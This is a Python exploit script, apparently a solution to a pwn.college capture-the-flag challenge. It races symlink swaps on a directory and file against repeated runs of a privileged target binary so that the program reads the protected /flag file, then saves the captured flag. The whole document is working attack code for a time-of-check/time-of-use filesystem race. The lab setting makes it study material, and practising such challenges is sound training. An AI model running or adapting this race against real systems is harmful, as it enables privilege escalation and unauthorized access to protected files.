#!/bin/python

from functools import partial
from pathlib import Path
from pwn import *
from os import *
import time

context.log_level = 'error'

TRIES = 1000000
DIR="/home/hacker/dir"
FILE = DIR + "/usr/bin/dash"

path = Path(FILE)

argv = ['nice', '-n19', sys.argv[1], FILE]
if len(sys.argv) > 2:
    argv.insert(0, 'strace')
    argv.insert(0, 'sudo')

pids = []


def unlink_wrapper(arg):
    try:
        unlink(arg)
    except:
        pass


def make_proc():
    with process(argv) as proc:
        time.sleep(0.1)
        out = proc.recvall(timeout=2)
        if b"pwn.college" in out:
            print(out)
            with open("flag.out", "w") as f:
                f.write(out)
            exit(0)


def create_workers(num: int, fn):
    for _ in range(num):
        pid = fork()
        if not pid:
            for _ in range(TRIES):
                try:
                    fn()
                except:
                    pass
            exit(0) 
        pids.append(pid)

try:
    unlink(FILE)
except:
    pass
try:
    unlink(DIR)
except:
    pass


try:
    create_workers(2, partial(symlink, "/home/hacker", DIR, target_is_directory=True))
    create_workers(2, lambda: path.touch())
    create_workers(2, make_proc)
    create_workers(2, partial(unlink, DIR))
    create_workers(2, partial(symlink, "/", DIR, target_is_directory=True))
    create_workers(2, partial(unlink, FILE))
    create_workers(2, partial(symlink, "/flag", FILE))

    for pid in pids:
        wait()
        pids.remove(pid)

except KeyboardInterrupt:
    for pid in pids:
        try: 
            kill(pid, 9)
        except:
            pass

